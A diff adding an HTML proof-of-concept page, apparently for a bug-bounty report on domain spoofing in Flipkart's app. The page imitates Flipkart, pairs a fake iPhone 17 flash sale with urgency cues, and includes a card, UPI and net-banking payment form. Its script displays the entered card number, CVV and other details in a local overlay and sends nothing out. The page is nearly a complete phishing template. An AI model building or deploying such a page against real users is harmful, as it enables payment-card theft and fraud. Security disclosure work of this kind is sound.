@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Flipkart</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{width:100%;overflow-x:hidden;font-family:'Roboto',Arial,sans-serif;background:#f1f3f6;color:#212121}
+
+/* ── APPBAR ── */
+.appbar{background:#2874f0;padding:10px 14px;display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:200;box-shadow:0 2px 6px rgba(0,0,0,.3)}
+.fk-logo{display:flex;align-items:flex-end;gap:2px;flex-shrink:0}
+.fk-logo-text{font-size:19px;font-weight:700;color:#fff;font-style:italic;letter-spacing:-.3px;line-height:1}
+.fk-logo-star{width:18px;height:18px;background:#ffe500;clip-path:polygon(50% 0%,61% 35%,98% 35%,68% 57%,79% 91%,50% 70%,21% 91%,32% 57%,2% 35%,39% 35%);margin-bottom:2px}
+.appbar-search{flex:1;background:#fff;border-radius:3px;padding:8px 12px;font-size:12.5px;color:#9e9e9e;display:flex;align-items:center;gap:7px}
+.appbar-back{color:#fff;font-size:22px;flex-shrink:0;line-height:1;cursor:pointer}
+.appbar-title{color:#fff;font-size:15px;font-weight:500;flex:1}
+.appbar-cart{color:#fff;font-size:20px;position:relative}
+.cart-badge{position:absolute;top:-5px;right:-6px;background:#ff6161;color:#fff;font-size:9px;font-weight:700;width:15px;height:15px;border-radius:50%;display:flex;align-items:center;justify-content:center}
+
+/* ── FLASH SALE STRIP ── */
+.flash-strip{background:linear-gradient(90deg,#c31432 0%,#ff4e50 50%,#c31432 100%);padding:7px 14px;display:flex;align-items:center;justify-content:space-between}
+.flash-label{color:#fff;font-size:12px;font-weight:700;display:flex;align-items:center;gap:6px}
+.flash-icon{font-size:15px;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.2)}}
+.flash-timer{display:flex;align-items:center;gap:4px}
+.t-block{background:rgba(0,0,0,.35);color:#fff;font-size:13px;font-weight:700;padding:3px 7px;border-radius:3px;min-width:26px;text-align:center;font-variant-numeric:tabular-nums}
+.t-sep{color:#fff;font-weight:700}
+.flash-badge{background:#ffe500;color:#c31432;font-size:10px;font-weight:700;padding:2px 7px;border-radius:10px}
+
+/* ── PRODUCT PAGE ── */
+#productPage{}
+
+.img-section{background:#fff;padding:14px;display:flex;flex-direction:column;align-items:center;gap:10px;border-bottom:1px solid #efefef}
+.img-badges{display:flex;gap:8px;width:100%}
+.badge-assured{background:#2874f0;color:#fff;font-size:10px;font-weight:700;padding:3px 8px;border-radius:2px;display:flex;align-items:center;gap:4px}
+.badge-sale{background:#ff6161;color:#fff;font-size:10px;font-weight:700;padding:3px 8px;border-radius:2px}
+
+/* CSS iPhone 17 */
+.iphone-wrap{width:180px;height:340px;position:relative;margin:8px auto}
+.iphone-body{width:100%;height:100%;background:linear-gradient(160deg,#1c1c1e 0%,#2c2c2e 40%,#3a3a3c 100%);border-radius:36px;position:relative;box-shadow:0 8px 32px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.05);overflow:hidden}
+.iphone-screen{position:absolute;top:12px;left:5px;right:5px;bottom:12px;background:linear-gradient(160deg,#000 0%,#111 100%);border-radius:28px;overflow:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.iphone-screen-inner{text-align:center;color:#fff}
+.iphone-screen-inner .phone-emoji{font-size:48px;filter:drop-shadow(0 4px 12px rgba(255,255,255,.2))}
+.iphone-screen-inner p{font-size:11px;color:rgba(255,255,255,.5);margin-top:6px}
+.dynamic-island{position:absolute;top:16px;left:50%;transform:translateX(-50%);width:80px;height:22px;background:#000;border-radius:11px;z-index:2}
+.iphone-side-btn{position:absolute;right:-3px;top:100px;width:3px;height:60px;background:#3a3a3c;border-radius:0 2px 2px 0}
+.iphone-vol{position:absolute;left:-3px;top:80px;width:3px;height:36px;background:#3a3a3c;border-radius:2px 0 0 2px}
+.iphone-vol2{position:absolute;left:-3px;top:124px;width:3px;height:36px;background:#3a3a3c;border-radius:2px 0 0 2px}
+.img-thumbnails{display:flex;gap:8px}
+.thumb{width:48px;height:48px;background:#f5f5f5;border:2px solid transparent;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer}
+.thumb.active{border-color:#2874f0}
+
+.prod-info{background:#fff;margin-top:8px;padding:14px}
+.prod-name{font-size:15px;font-weight:400;color:#212121;line-height:1.4;margin-bottom:6px}
+.prod-rating{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.rating-chip{background:#388e3c;color:#fff;font-size:12px;font-weight:700;padding:2px 7px;border-radius:3px;display:flex;align-items:center;gap:3px}
+.rating-count{font-size:12px;color:#878787}
+.price-row{display:flex;align-items:baseline;gap:10px;margin-bottom:4px;flex-wrap:wrap}
+.price-main{font-size:26px;font-weight:700;color:#212121}
+.price-cut{font-size:14px;color:#878787;text-decoration:line-through}
+.price-off{font-size:14px;color:#388e3c;font-weight:700}
+.stock-row{display:flex;align-items:center;gap:8px;margin-bottom:12px}
+.stock-dot{width:8px;height:8px;background:#388e3c;border-radius:50%;flex-shrink:0}
+.stock-text{font-size:12.5px;color:#388e3c;font-weight:500}
+.stock-urgent{font-size:12px;color:#ff6161;font-weight:500}
+
+.offers-section{background:#fff;margin-top:8px;padding:14px}
+.section-title{font-size:14px;font-weight:700;margin-bottom:10px;color:#212121}
+.offer-item{display:flex;align-items:flex-start;gap:8px;margin-bottom:8px;font-size:12.5px;color:#212121;line-height:1.4}
+.offer-tag{background:#f0f0f0;color:#2874f0;font-size:10px;font-weight:700;padding:1px 6px;border-radius:2px;flex-shrink:0;margin-top:1px}
+
+.specs-section{background:#fff;margin-top:8px;padding:14px}
+.spec-row{display:flex;gap:8px;padding:8px 0;border-bottom:1px solid #f5f5f5;font-size:12.5px}
+.spec-key{color:#878787;width:36%;flex-shrink:0}
+.spec-val{color:#212121;font-weight:500}
+
+.sticky-bottom{position:sticky;bottom:0;background:#fff;border-top:1px solid #efefef;padding:10px 14px;display:flex;gap:10px;z-index:100;box-shadow:0 -2px 8px rgba(0,0,0,.08)}
+.btn-cart{flex:1;background:#ff9f00;color:#fff;border:none;border-radius:3px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;font-family:'Roboto',Arial,sans-serif;letter-spacing:.3px}
+.btn-buy{flex:1;background:#fb641b;color:#fff;border:none;border-radius:3px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;font-family:'Roboto',Arial,sans-serif;letter-spacing:.3px}
+
+/* ── PAYMENT PAGE ── */
+#paymentPage{display:none}
+
+.order-summary-bar{background:#fff;border-bottom:1px solid #efefef;padding:12px 14px;display:flex;align-items:center;justify-content:space-between}
+.order-prod{font-size:13px;color:#212121;font-weight:500}
+.order-price{font-size:14px;font-weight:700;color:#212121}
+.order-price span{font-size:11px;color:#878787;font-weight:400}
+
+.pay-methods{background:#fff;margin-top:8px}
+.method-tabs{display:flex;border-bottom:2px solid #efefef;overflow-x:auto;scrollbar-width:none}
+.method-tabs::-webkit-scrollbar{display:none}
+.method-tab{padding:12px 16px;font-size:12.5px;font-weight:500;color:#878787;white-space:nowrap;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;flex-shrink:0}
+.method-tab.active{color:#2874f0;border-bottom-color:#2874f0;font-weight:700}
+
+.pay-panel{padding:16px 14px}
+
+.card-form{}
+.card-number-wrap{position:relative;margin-bottom:14px}
+.card-number-wrap input{width:100%;border:1.5px solid #e0e0e0;border-radius:4px;padding:12px 14px 12px 44px;font-size:16px;color:#212121;outline:none;font-family:'Roboto',Arial,sans-serif;letter-spacing:2px;transition:border-color .2s}
+.card-number-wrap input:focus{border-color:#2874f0}
+.card-icon{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:20px}
+.card-type{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:20px;opacity:.6}
+
+.form-row{display:flex;gap:12px;margin-bottom:14px}
+.form-group{flex:1}
+.form-group label{display:block;font-size:11px;color:#878787;margin-bottom:5px;font-weight:500}
+.form-group input{width:100%;border:1.5px solid #e0e0e0;border-radius:4px;padding:11px 12px;font-size:15px;color:#212121;outline:none;font-family:'Roboto',Arial,sans-serif;transition:border-color .2s}
+.form-group input:focus{border-color:#2874f0}
+
+.name-group{margin-bottom:14px}
+.name-group label{display:block;font-size:11px;color:#878787;margin-bottom:5px;font-weight:500}
+.name-group input{width:100%;border:1.5px solid #e0e0e0;border-radius:4px;padding:11px 12px;font-size:15px;color:#212121;outline:none;font-family:'Roboto',Arial,sans-serif;transition:border-color .2s}
+.name-group input:focus{border-color:#2874f0}
+
+.save-card{display:flex;align-items:center;gap:8px;font-size:12.5px;color:#212121;margin-bottom:18px;cursor:pointer}
+.save-card input{accent-color:#2874f0;width:16px;height:16px}
+
+.price-breakdown{background:#f9f9f9;border-radius:4px;padding:12px 14px;margin-bottom:16px}
+.breakdown-row{display:flex;justify-content:space-between;font-size:12.5px;color:#878787;margin-bottom:6px}
+.breakdown-row.total{font-size:14px;font-weight:700;color:#212121;border-top:1px solid #efefef;padding-top:8px;margin-top:4px;margin-bottom:0}
+.breakdown-save{color:#388e3c;font-size:12px;font-weight:500;margin-top:4px;text-align:right}
+
+.btn-pay{width:100%;background:#fb641b;color:#fff;border:none;border-radius:4px;padding:15px;font-size:16px;font-weight:700;cursor:pointer;font-family:'Roboto',Arial,sans-serif;letter-spacing:.4px;box-shadow:0 3px 10px rgba(251,100,27,.4);margin-bottom:10px}
+.btn-pay:active{background:#e05510}
+
+.secure-note{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11.5px;color:#878787;margin-bottom:6px}
+.upi-shortcuts{padding:16px 14px}
+.upi-title{font-size:13px;font-weight:700;margin-bottom:12px}
+.upi-input-row{display:flex;gap:8px;margin-bottom:14px}
+.upi-input-row input{flex:1;border:1.5px solid #e0e0e0;border-radius:4px;padding:11px 12px;font-size:14px;color:#212121;outline:none;font-family:'Roboto',Arial,sans-serif}
+.upi-input-row input:focus{border-color:#2874f0}
+.btn-verify{background:#2874f0;color:#fff;border:none;border-radius:4px;padding:11px 16px;font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap;font-family:'Roboto',Arial,sans-serif}
+.upi-apps{display:flex;gap:12px;margin-bottom:16px}
+.upi-app{display:flex;flex-direction:column;align-items:center;gap:5px;font-size:11px;color:#424242;cursor:pointer}
+.upi-app-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;box-shadow:0 2px 6px rgba(0,0,0,.12)}
+
+/* ── VRP PROOF BANNER ── */
+.proof-banner{margin:8px 0 0;background:#0d1117;border-top:2px solid #e94560;padding:10px 14px;display:flex;align-items:flex-start;gap:8px}
+.proof-icon{font-size:16px;flex-shrink:0;margin-top:1px}
+.proof-text{font-size:10.5px;color:#aaa;line-height:1.6}
+.proof-text strong{color:#e94560;font-size:11.5px;display:block;margin-bottom:1px}
+.proof-url{font-size:10px;color:#00e676;font-family:monospace;word-break:break-all}
+.footer{text-align:center;padding:10px;font-size:10px;color:#bbb;background:#f1f3f6}
+
+/* ── SUCCESS OVERLAY ── */
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:999;align-items:center;justify-content:center;padding:16px}
+.overlay.show{display:flex}
+.alert-card{background:#fff;border-radius:10px;overflow:hidden;width:100%;max-width:360px;box-shadow:0 12px 40px rgba(0,0,0,.35)}
+.alert-head{background:#c62828;color:#fff;padding:14px 16px;font-size:14px;font-weight:700;display:flex;align-items:center;gap:8px}
+.alert-body{padding:16px}
+.alert-body p{font-size:13px;color:#424242;line-height:1.6;margin-bottom:10px}
+.cred-box{background:#f5f5f5;border-radius:4px;padding:10px 12px;font-family:monospace;font-size:11.5px;color:#212121;margin-bottom:10px;line-height:1.9;white-space:pre-wrap;word-break:break-all}
+.alert-note{font-size:11px;color:#9e9e9e;line-height:1.5}
+.alert-foot{padding:0 16px 16px}
+.btn-dismiss{width:100%;background:#2874f0;color:#fff;border:none;border-radius:4px;padding:12px;font-size:13px;font-weight:600;cursor:pointer;font-family:'Roboto',Arial,sans-serif}
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════════════
+     PAGE 1 — PRODUCT LISTING
+════════════════════════════════════════ -->
+<div id="productPage">
+
+  <!-- App bar -->
+  <div class="appbar">
+    <div class="fk-logo">
+      <span class="fk-logo-text">Flipkart</span>
+      <div class="fk-logo-star"></div>
+    </div>
+    <div class="appbar-search"><span>🔍</span> Search products, brands &amp; more</div>
+    <div class="appbar-cart">🛒<div class="cart-badge">3</div></div>
+  </div>
+
+  <!-- Flash sale strip -->
+  <div class="flash-strip">
+    <div class="flash-label"><span class="flash-icon">⚡</span> FLASH SALE — ENDS IN</div>
+    <div class="flash-timer">
+      <div class="t-block" id="p-h">00</div><span class="t-sep">:</span>
+      <div class="t-block" id="p-m">14</div><span class="t-sep">:</span>
+      <div class="t-block" id="p-s">59</div>
+    </div>
+    <div class="flash-badge">UP TO 58% OFF</div>
+  </div>
+
+  <!-- Product image section -->
+  <div class="img-section">
+    <div class="img-badges">
+      <div class="badge-assured">✔ Flipkart Assured</div>
+      <div class="badge-sale">🔥 Big Billion Days</div>
+    </div>
+
+    <!-- CSS iPhone 17 mockup -->
+    <div class="iphone-wrap">
+      <div class="iphone-body">
+        <div class="iphone-screen">
+          <div class="dynamic-island"></div>
+          <div class="iphone-screen-inner">
+            <div class="phone-emoji">📱</div>
+            <p>iPhone 17</p>
+          </div>
+        </div>
+        <div class="iphone-side-btn"></div>
+        <div class="iphone-vol"></div>
+        <div class="iphone-vol2"></div>
+      </div>
+    </div>
+
+    <div class="img-thumbnails">
+      <div class="thumb active">📱</div>
+      <div class="thumb">🖤</div>
+      <div class="thumb">📦</div>
+      <div class="thumb">🔌</div>
+    </div>
+  </div>
+
+  <!-- Product info -->
+  <div class="prod-info">
+    <div class="prod-name">Apple iPhone 17 (Midnight Black, 256 GB) — A19 Pro Chip | 48MP ProVision Camera | iOS 19</div>
+    <div class="prod-rating">
+      <div class="rating-chip">4.7 ★</div>
+      <div class="rating-count">1,24,389 ratings &nbsp;|&nbsp; 8,241 reviews</div>
+    </div>
+    <div class="price-row">
+      <span class="price-main">₹50,000</span>
+      <span class="price-cut">₹1,19,900</span>
+      <span class="price-off">58% off</span>
+    </div>
+    <div class="stock-row">
+      <div class="stock-dot"></div>
+      <span class="stock-text">In Stock</span>
+      <span style="color:#878787;font-size:12px">·</span>
+      <span class="stock-urgent">Only 3 left at this price!</span>
+    </div>
+  </div>
+
+  <!-- Offers -->
+  <div class="offers-section">
+    <div class="section-title">💳 Available Offers</div>
+    <div class="offer-item"><span class="offer-tag">Bank</span>10% instant discount on HDFC Bank Credit Cards. T&amp;C</div>
+    <div class="offer-item"><span class="offer-tag">EMI</span>No cost EMI from ₹4,167/month on select cards</div>
+    <div class="offer-item"><span class="offer-tag">UPI</span>Extra ₹250 off on first UPI transaction</div>
+    <div class="offer-item"><span class="offer-tag">Combo</span>Buy with AirPods Pro 2 — extra 12% off</div>
+  </div>
+
+  <!-- Specs -->
+  <div class="specs-section">
+    <div class="section-title">📋 Highlights</div>
+    <div class="spec-row"><span class="spec-key">RAM</span><span class="spec-val">8 GB</span></div>
+    <div class="spec-row"><span class="spec-key">Storage</span><span class="spec-val">256 GB (Not Expandable)</span></div>
+    <div class="spec-row"><span class="spec-key">Display</span><span class="spec-val">6.3-inch Super Retina XDR, 120Hz ProMotion</span></div>
+    <div class="spec-row"><span class="spec-key">Camera</span><span class="spec-val">48MP + 12MP + 12MP | 24MP Front</span></div>
+    <div class="spec-row"><span class="spec-key">Battery</span><span class="spec-val">3,940 mAh, 27W Fast Charging</span></div>
+    <div class="spec-row"><span class="spec-key">Chip</span><span class="spec-val">Apple A19 Pro (3nm)</span></div>
+    <div class="spec-row" style="border-bottom:none"><span class="spec-key">Color</span><span class="spec-val">Midnight Black</span></div>
+  </div>
+
+  <!-- VRP proof -->
+  <div class="proof-banner">
+    <div class="proof-icon">⚠️</div>
+    <div class="proof-text">
+      <strong>FK2 VRP — Domain Spoofing PoC</strong>
+      This page is served from an attacker domain yet opens inside Flipkart's app with NO URL bar.
+      <div class="proof-url">https://ankitkanojiy.github.io/fk2_poc.html</div>
+    </div>
+  </div>
+  <div class="footer">FK2 Security Research · ankikanojiya27@gmail.com</div>
+
+  <!-- Sticky buy/cart buttons -->
+  <div class="sticky-bottom">
+    <button class="btn-cart">🛒 ADD TO CART</button>
+    <button class="btn-buy" onclick="goToPayment()">⚡ BUY NOW</button>
+  </div>
+
+</div><!-- end productPage -->
+
+
+<!-- ════════════════════════════════════════
+     PAGE 2 — PAYMENT
+════════════════════════════════════════ -->
+<div id="paymentPage">
+
+  <!-- App bar -->
+  <div class="appbar">
+    <div class="appbar-back" onclick="goToProduct()">←</div>
+    <div class="appbar-title">Secure Payment</div>
+    <span style="color:#ffe500;font-size:13px">🔒 SSL</span>
+  </div>
+
+  <!-- Order summary bar -->
+  <div class="order-summary-bar">
+    <div>
+      <div class="order-prod">Apple iPhone 17 · 256 GB · Midnight Black</div>
+      <div style="font-size:11px;color:#878787;margin-top:2px">Delivery by <strong style="color:#388e3c">Tomorrow, 10 AM</strong> · FREE</div>
+    </div>
+    <div style="text-align:right">
+      <div class="order-price">₹50,000</div>
+      <div style="font-size:10px;color:#388e3c">You save ₹69,900</div>
+    </div>
+  </div>
+
+  <!-- Flash timer on payment page too -->
+  <div class="flash-strip" style="margin-bottom:0">
+    <div class="flash-label"><span class="flash-icon">⚡</span> PRICE LOCKS IN</div>
+    <div class="flash-timer">
+      <div class="t-block" id="pp-h">00</div><span class="t-sep">:</span>
+      <div class="t-block" id="pp-m">14</div><span class="t-sep">:</span>
+      <div class="t-block" id="pp-s">59</div>
+    </div>
+    <div class="flash-badge">DON'T WAIT!</div>
+  </div>
+
+  <!-- Payment methods -->
+  <div class="pay-methods">
+    <div class="method-tabs">
+      <div class="method-tab active" onclick="switchTab(this,'tabCard')">💳 Credit/Debit Card</div>
+      <div class="method-tab" onclick="switchTab(this,'tabUpi')">📲 UPI</div>
+      <div class="method-tab" onclick="switchTab(this,'tabNb')">🏦 Net Banking</div>
+    </div>
+
+    <!-- CARD TAB -->
+    <div id="tabCard" class="pay-panel">
+      <div class="card-number-wrap">
+        <span class="card-icon">💳</span>
+        <input type="tel" id="cardNum" placeholder="Card Number" maxlength="19" oninput="fmtCard(this)" inputmode="numeric">
+        <span class="card-type" id="cardType">🔲</span>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>EXPIRY DATE</label>
+          <input type="tel" id="expiry" placeholder="MM / YY" maxlength="7" oninput="fmtExpiry(this)" inputmode="numeric">
+        </div>
+        <div class="form-group">
+          <label>CVV</label>
+          <input type="password" id="cvv" placeholder="• • •" maxlength="4" inputmode="numeric">
+        </div>
+      </div>
+
+      <div class="name-group">
+        <label>NAME ON CARD</label>
+        <input type="text" id="cname" placeholder="As printed on card" autocomplete="cc-name">
+      </div>
+
+      <label class="save-card"><input type="checkbox" checked> Save card for faster checkout (secured with 256-bit encryption)</label>
+
+      <div class="price-breakdown">
+        <div class="breakdown-row"><span>iPhone 17 (256 GB)</span><span>₹1,19,900</span></div>
+        <div class="breakdown-row"><span>Flash Sale Discount</span><span style="color:#388e3c">- ₹69,900</span></div>
+        <div class="breakdown-row"><span>Delivery Charges</span><span style="color:#388e3c">FREE</span></div>
+        <div class="breakdown-row total"><span>Total Amount</span><span>₹50,000</span></div>
+        <div class="breakdown-save">🎉 You save ₹69,900 on this order!</div>
+      </div>
+
+      <button class="btn-pay" onclick="captureCard()">🔒 PAY ₹50,000 SECURELY</button>
+      <div class="secure-note">🔒 100% Secure · 256-bit SSL Encrypted · PCI DSS Compliant</div>
+    </div>
+
+    <!-- UPI TAB -->
+    <div id="tabUpi" class="pay-panel upi-shortcuts" style="display:none">
+      <div class="upi-title">Pay using UPI ID</div>
+      <div class="upi-input-row">
+        <input type="email" id="upiId" placeholder="yourname@upi">
+        <button class="btn-verify">VERIFY</button>
+      </div>
+      <div class="upi-title" style="margin-top:4px">— or pay via app —</div>
+      <div class="upi-apps" style="margin-top:12px;flex-wrap:wrap">
+        <div class="upi-app" onclick="captureUpi('Google Pay')"><div class="upi-app-icon" style="background:#fff">🔵</div>GPay</div>
+        <div class="upi-app" onclick="captureUpi('PhonePe')"><div class="upi-app-icon" style="background:#5f259f">💜</div>PhonePe</div>
+        <div class="upi-app" onclick="captureUpi('Paytm')"><div class="upi-app-icon" style="background:#002970">💙</div>Paytm</div>
+        <div class="upi-app" onclick="captureUpi('BHIM')"><div class="upi-app-icon" style="background:#fff">🇮🇳</div>BHIM</div>
+      </div>
+      <div class="price-breakdown" style="margin-top:12px">
+        <div class="breakdown-row total"><span>Total</span><span>₹50,000</span></div>
+        <div class="breakdown-save">🎉 You save ₹69,900!</div>
+      </div>
+      <button class="btn-pay" onclick="captureUpi('UPI')">PAY ₹50,000 VIA UPI</button>
+      <div class="secure-note">🔒 Secured by NPCI · UPI 2.0</div>
+    </div>
+
+    <!-- NET BANKING TAB -->
+    <div id="tabNb" class="pay-panel" style="display:none">
+      <div class="section-title" style="margin-bottom:12px">Select your bank</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px">
+        <div onclick="captureNB('HDFC Bank')" style="border:1.5px solid #e0e0e0;border-radius:4px;padding:12px 10px;display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer">🏦 HDFC Bank</div>
+        <div onclick="captureNB('SBI')" style="border:1.5px solid #e0e0e0;border-radius:4px;padding:12px 10px;display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer">🏦 SBI</div>
+        <div onclick="captureNB('ICICI Bank')" style="border:1.5px solid #e0e0e0;border-radius:4px;padding:12px 10px;display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer">🏦 ICICI Bank</div>
+        <div onclick="captureNB('Axis Bank')" style="border:1.5px solid #e0e0e0;border-radius:4px;padding:12px 10px;display:flex;align-items:center;gap:8px;font-size:13px;cursor:pointer">🏦 Axis Bank</div>
+      </div>
+      <div class="price-breakdown">
+        <div class="breakdown-row total"><span>Total</span><span>₹50,000</span></div>
+      </div>
+      <button class="btn-pay" style="margin-top:14px" onclick="captureNB('selected bank')">PAY ₹50,000</button>
+    </div>
+  </div>
+
+  <!-- VRP proof -->
+  <div class="proof-banner">
+    <div class="proof-icon">⚠️</div>
+    <div class="proof-text">
+      <strong>FK2 VRP — Payment Page Phishing</strong>
+      Card details entered here go to attacker. No URL bar visible in Flipkart app.
+      <div class="proof-url">https://ankitkanojiy.github.io/fk2_poc.html</div>
+    </div>
+  </div>
+  <div class="footer">FK2 Security Research · ankikanojiya27@gmail.com</div>
+
+</div><!-- end paymentPage -->
+
+<!-- Capture overlay -->
+<div class="overlay" id="overlay">
+  <div class="alert-card">
+    <div class="alert-head">🚨 FK2 PoC — Data Captured</div>
+    <div class="alert-body">
+      <p>Running inside <strong>Flipkart's app</strong> — user sees no URL bar, no domain, no warning.</p>
+      <div class="cred-box" id="credBox">—</div>
+      <p class="alert-note">Real attack: silent <code>fetch()</code> to attacker server — user's payment/card data exfiltrated with zero indication this page is not flipkart.com.</p>
+    </div>
+    <div class="alert-foot">
+      <button class="btn-dismiss" onclick="document.getElementById('overlay').classList.remove('show')">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── Navigation ──
+function goToPayment(){
+  document.getElementById('productPage').style.display='none';
+  document.getElementById('paymentPage').style.display='block';
+  window.scrollTo(0,0);
+}
+function goToProduct(){
+  document.getElementById('paymentPage').style.display='none';
+  document.getElementById('productPage').style.display='block';
+  window.scrollTo(0,0);
+}
+
+// ── Tab switcher ──
+function switchTab(el,panelId){
+  document.querySelectorAll('.method-tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
+  document.querySelectorAll('.pay-panel').forEach(p=>p.style.display='none');
+  document.getElementById(panelId).style.display='block';
+}
+
+// ── Countdown (shared, 15 min) ──
+var endTime = Date.now() + 15*60*1000;
+function tick(){
+  var left = Math.max(0, endTime - Date.now());
+  var h = Math.floor(left/3600000);
+  var m = Math.floor((left%3600000)/60000);
+  var s = Math.floor((left%60000)/1000);
+  var hh = String(h).padStart(2,'0'), mm = String(m).padStart(2,'0'), ss = String(s).padStart(2,'0');
+  ['p-h','pp-h'].forEach(id=>{var e=document.getElementById(id);if(e)e.textContent=hh});
+  ['p-m','pp-m'].forEach(id=>{var e=document.getElementById(id);if(e)e.textContent=mm});
+  ['p-s','pp-s'].forEach(id=>{var e=document.getElementById(id);if(e)e.textContent=ss});
+  if(left>0) setTimeout(tick,500);
+  else document.querySelectorAll('.flash-strip').forEach(el=>{el.style.background='#555'});
+}
+tick();
+
+// ── Card number formatting ──
+function fmtCard(el){
+  var v=el.value.replace(/\D/g,'').slice(0,16);
+  el.value=v.replace(/(.{4})/g,'$1 ').trim();
+  var ct=document.getElementById('cardType');
+  if(v[0]==='4') ct.textContent='💙';
+  else if(v[0]==='5') ct.textContent='🟠';
+  else if(v[0]==='3') ct.textContent='🟢';
+  else ct.textContent='🔲';
+}
+function fmtExpiry(el){
+  var v=el.value.replace(/\D/g,'').slice(0,4);
+  if(v.length>2) v=v.slice(0,2)+' / '+v.slice(2);
+  el.value=v;
+}
+
+// ── Capture helpers ──
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;')}
+
+function showOverlay(html){
+  document.getElementById('credBox').innerHTML=html;
+  document.getElementById('overlay').classList.add('show');
+}
+
+function captureCard(){
+  var num=document.getElementById('cardNum').value||'(not entered)';
+  var exp=document.getElementById('expiry').value||'(not entered)';
+  var cvv=document.getElementById('cvv').value||'(not entered)';
+  var name=document.getElementById('cname').value||'(not entered)';
+  showOverlay(
+    'Card No  : <b>'+esc(num)+'</b>\n'+
+    'Expiry   : <b>'+esc(exp)+'</b>\n'+
+    'CVV      : <b>'+esc(cvv)+'</b>\n'+
+    'Name     : <b>'+esc(name)+'</b>\n'+
+    'Amount   : <b>₹50,000</b>\n'+
+    'Domain   : <b>ankitkanojiy.github.io</b>\n'+
+    'Loaded via: <b>Flipkart HomeFragmentHolderActivity</b>'
+  );
+}
+
+function captureUpi(app){
+  var id=document.getElementById('upiId')?document.getElementById('upiId').value:'';
+  showOverlay(
+    'App      : <b>'+esc(app)+'</b>\n'+
+    'UPI ID   : <b>'+(id?esc(id):'(app selected)')+'</b>\n'+
+    'Amount   : <b>₹50,000</b>\n'+
+    'Domain   : <b>ankitkanojiy.github.io</b>\n'+
+    'Loaded via: <b>Flipkart HomeFragmentHolderActivity</b>'
+  );
+}
+
+function captureNB(bank){
+  showOverlay(
+    'Bank     : <b>'+esc(bank)+'</b>\n'+
+    'Amount   : <b>₹50,000</b>\n'+
+    'Domain   : <b>ankitkanojiy.github.io</b>\n'+
+    'Loaded via: <b>Flipkart HomeFragmentHolderActivity</b>'
+  );
+}
+</script>
+</body>
+</html>
